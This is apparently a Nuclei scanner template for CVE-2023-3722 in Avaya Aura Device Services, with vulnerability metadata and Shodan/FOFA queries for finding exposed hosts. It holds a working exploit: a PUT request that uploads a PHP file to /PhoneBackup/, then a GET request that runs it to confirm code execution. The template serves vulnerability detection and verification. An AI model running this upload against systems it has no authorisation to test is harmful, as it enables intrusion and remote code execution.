id: CVE-2023-3722

info:
  name: Avaya Aura Device Services - OS Command Injection
  author: iamnoooob,pdresearch
  severity: high
  description: |
    An OS command injection vulnerability was found in the Avaya Aura Device Services Web application which could allow remote code execution as the Web server user via a malicious uploaded file. This issue affects Avaya Aura Device Services version 8.1.4.0 and earlier.
  reference:
    - https://github.com/pizza-power/CVE-2023-3722
    - https://download.avaya.com/css/public/documents/101076366
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H
    cvss-score: 8.6
    cve-id: CVE-2023-3722
    cwe-id: CWE-434
    epss-score: 0.02738
    epss-percentile: 0.85305
    cpe: cpe:2.3:a:avaya:aura_device_services:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: avaya
    product: aura_device_services
    shodan-query: html:"Avaya Aura&reg;&nbsp;Utility Services"
    fofa-query: body="Avaya Aura&reg;&nbsp;Utility Services"
  tags: cve,cve2023,avaya,rce,upload,deviceservices,intrusive

variables:
  filename: "{{randbase(8)}}"
  marker: "{{randstr}}"

http:
  - raw:
      - |
        PUT /PhoneBackup/{{filename}}.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: AVAYA

        <?phP echo base64_decode($_GET['input']); ?>

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 201'
          - 'contains(body, "Resource /PhoneBackup/{{filename}}.php has been created.")'
        condition: and
        internal: true

  - raw:
      - |
        GET /PhoneBackup/{{filename}}.php?input={{base64(marker)}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: AVAYA

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "{{marker}}")'
        condition: and
# digest: 4a0a00473045022072fd35d1bff9f7e5801b3479dbdc47264dd6a692989dd4b17554a8b8f33ff032022100f0052e93d4e9dffd4956936fc0c345c55c0a8024eb70016cd514b44983ab5608:922c64590222798bb761d5b6d8e72950